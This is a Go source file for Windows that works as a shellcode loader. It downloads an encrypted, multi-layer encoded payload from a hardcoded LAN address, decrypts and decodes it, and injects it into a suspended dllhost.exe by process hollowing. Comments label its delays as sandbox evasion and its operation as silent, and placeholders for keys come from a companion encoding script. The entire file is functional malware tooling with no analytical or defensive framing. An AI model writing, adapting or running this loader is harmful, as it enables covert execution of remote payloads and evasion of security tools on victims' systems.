package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"io"
	"net/http"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	CREATE_SUSPENDED              = 0x00000004
	MEM_COMMIT                    = 0x00001000
	MEM_RESERVE                   = 0x00002000
	PAGE_EXECUTE_READWRITE        = 0x40
	CONTEXT_FULL          uintptr = 0x10000b
)

// PASTE DECODER PARAMETERS HERE (from encode_shellcode.py output)
// Decoder parameters (generated by encode_shellcode.py)
const (
	DECODER_SEED    = 0          // REPLACE ME
	XOR_KEY1        = 0x00       // REPLACE ME
	ROL_BITS        = 0          // REPLACE ME
	ADD_KEY         = 0x00       // REPLACE ME
	XOR_KEY2        = 0x00       // REPLACE ME
	ORIGINAL_LENGTH = 0          // REPLACE ME
	ENCODED_LENGTH  = 0          // REPLACE ME
)

// Configuration
const (
	PAYLOAD_URL = "http://192.168.88.166:8000/payload.enc"
	AES_KEY     = "PASTE_YOUR_AES_KEY_HERE" // REPLACE ME
)

// Windows API structures
type STARTUPINFO struct {
	Cb              uint32
	_               *uint16
	Desktop         *uint16
	Title           *uint16
	X               uint32
	Y               uint32
	XSize           uint32
	YSize           uint32
	XCountChars     uint32
	YCountChars     uint32
	FillAttribute   uint32
	Flags           uint32
	ShowWindow      uint16
	_               uint16
	_               *byte
	StdInput        uintptr
	StdOutput       uintptr
	StdError        uintptr
}

type PROCESS_INFORMATION struct {
	Process   uintptr
	Thread    uintptr
	ProcessId uint32
	ThreadId  uint32
}

type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FltSave              [512]byte
	VectorRegister       [26][16]byte
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

var (
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	ntdll                    = syscall.NewLazyDLL("ntdll.dll")
	procCreateProcessA       = kernel32.NewProc("CreateProcessA")
	procVirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
	procReadProcessMemory    = kernel32.NewProc("ReadProcessMemory")
	procGetThreadContext     = kernel32.NewProc("GetThreadContext")
	procSetThreadContext     = kernel32.NewProc("SetThreadContext")
	procResumeThread         = kernel32.NewProc("ResumeThread")
	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
)

// Custom decoder - reverses polymorphic encoding
func polymorphicDecode(encoded []byte) []byte {
	// Layer 6 (reverse): Remove junk bytes (0xAA markers)
	noJunk := make([]byte, 0, len(encoded)/2)
	for i := 0; i < len(encoded); i += 2 {
		if i+1 < len(encoded) && encoded[i] == 0xAA {
			noJunk = append(noJunk, encoded[i+1])
		}
	}

	// Layer 5 (reverse): XOR with key2
	decoded := xorDecode(noJunk, XOR_KEY2)

	// Layer 4 (reverse): Unswap bytes
	decoded = swapBytes(decoded)

	// Layer 3 (reverse): SUB (reverse of ADD)
	decoded = subDecode(decoded, ADD_KEY)

	// Layer 2 (reverse): ROR (reverse of ROL)
	decoded = rorDecode(decoded, ROL_BITS)

	// Layer 1 (reverse): XOR with key1
	decoded = xorDecode(decoded, XOR_KEY1)

	return decoded
}

func xorDecode(data []byte, key byte) []byte {
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key
	}
	return result
}

func rorDecode(data []byte, bits int) []byte {
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = byte((int(b) >> bits) | (int(b) << (8 - bits)))
	}
	return result
}

func subDecode(data []byte, key byte) []byte {
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = (b - key) & 0xFF
	}
	return result
}

func swapBytes(data []byte) []byte {
	result := make([]byte, len(data))
	copy(result, data)
	for i := 0; i < len(result)-1; i += 2 {
		result[i], result[i+1] = result[i+1], result[i]
	}
	return result
}

// FetchPayload downloads encrypted payload
func FetchPayload(url string) ([]byte, error) {
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("server returned: %s", resp.Status)
	}

	return io.ReadAll(resp.Body)
}

// DecryptAES decrypts AES-256-GCM encrypted data
func DecryptAES(encrypted []byte, keyHex string) ([]byte, error) {
	key := make([]byte, 32)
	for i := 0; i < 32; i++ {
		fmt.Sscanf(keyHex[i*2:i*2+2], "%02x", &key[i])
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	if len(encrypted) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce := encrypted[:gcm.NonceSize()]
	ciphertext := encrypted[gcm.NonceSize():]

	return gcm.Open(nil, nonce, ciphertext, nil)
}

func CreateProcess(commandLine string) (*PROCESS_INFORMATION, error) {
	var si STARTUPINFO
	var pi PROCESS_INFORMATION
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := syscall.BytePtrFromString(commandLine)
	if err != nil {
		return nil, err
	}

	ret, _, err := procCreateProcessA.Call(
		0, uintptr(unsafe.Pointer(cmdLine)), 0, 0, 0,
		CREATE_SUSPENDED, 0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("CreateProcessA failed: %v", err)
	}
	return &pi, nil
}

func GetThreadContext(thread uintptr, ctx *CONTEXT) error {
	ctx.ContextFlags = uint32(CONTEXT_FULL)
	ret, _, err := procGetThreadContext.Call(thread, uintptr(unsafe.Pointer(ctx)))
	if ret == 0 {
		return err
	}
	return nil
}

func ReadProcessMemory(process uintptr, address uintptr, size uint32) ([]byte, error) {
	buffer := make([]byte, size)
	var bytesRead uintptr
	ret, _, err := procReadProcessMemory.Call(
		process, address,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return nil, err
	}
	return buffer, nil
}

func WriteProcessMemory(process uintptr, address uintptr, data []byte) error {
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		process, address,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return err
	}
	return nil
}

func SetThreadContext(thread uintptr, ctx *CONTEXT) error {
	ret, _, err := procSetThreadContext.Call(thread, uintptr(unsafe.Pointer(ctx)))
	if ret == 0 {
		return err
	}
	return nil
}

func ResumeThread(thread uintptr) error {
	ret, _, _ := procResumeThread.Call(thread)
	if ret == 0xFFFFFFFF {
		return fmt.Errorf("ResumeThread failed")
	}
	return nil
}

func ProcessHollow(payload []byte, targetProcess string) error {
	pi, err := CreateProcess(targetProcess)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(syscall.Handle(pi.Process))
	defer syscall.CloseHandle(syscall.Handle(pi.Thread))

	var ctx CONTEXT
	if err := GetThreadContext(pi.Thread, &ctx); err != nil {
		syscall.TerminateProcess(syscall.Handle(pi.Process), 1)
		return err
	}

	imageBaseBuffer, err := ReadProcessMemory(pi.Process, uintptr(ctx.Rdx+0x10), 8)
	if err != nil {
		syscall.TerminateProcess(syscall.Handle(pi.Process), 1)
		return err
	}

	executableAddress := *(*uint64)(unsafe.Pointer(&imageBaseBuffer[0]))
	dataBuf, err := ReadProcessMemory(pi.Process, uintptr(executableAddress), 0x200)
	if err != nil {
		syscall.TerminateProcess(syscall.Handle(pi.Process), 1)
		return err
	}

	e_lfanew := *(*uint32)(unsafe.Pointer(&dataBuf[0x3c]))
	rva := *(*uint32)(unsafe.Pointer(&dataBuf[e_lfanew+0x28]))
	entrypointAddr := executableAddress + uint64(rva)

	if err := WriteProcessMemory(pi.Process, uintptr(entrypointAddr), payload); err != nil {
		syscall.TerminateProcess(syscall.Handle(pi.Process), 1)
		return err
	}

	time.Sleep(500 * time.Millisecond)

	if err := ResumeThread(pi.Thread); err != nil {
		syscall.TerminateProcess(syscall.Handle(pi.Process), 1)
		return err
	}

	return nil
}

func main() {
	// Silent operation - no output
	// Sandbox evasion: sleep
	time.Sleep(10 * time.Second)

	// Fetch encrypted+encoded payload
	encryptedPayload, err := FetchPayload(PAYLOAD_URL)
	if err != nil {
		os.Exit(1)
	}

	// Decrypt AES layer
	encodedPayload, err := DecryptAES(encryptedPayload, AES_KEY)
	if err != nil {
		os.Exit(1)
	}

	// Decode polymorphic layers
	payload := polymorphicDecode(encodedPayload)

	// Verify size
	if len(payload) != ORIGINAL_LENGTH {
		os.Exit(1)
	}

	// Sleep again
	time.Sleep(5 * time.Second)

	// Process hollowing
	if err := ProcessHollow(payload, "C:\\Windows\\System32\\dllhost.exe"); err != nil {
		os.Exit(1)
	}

	time.Sleep(2 * time.Second)
}
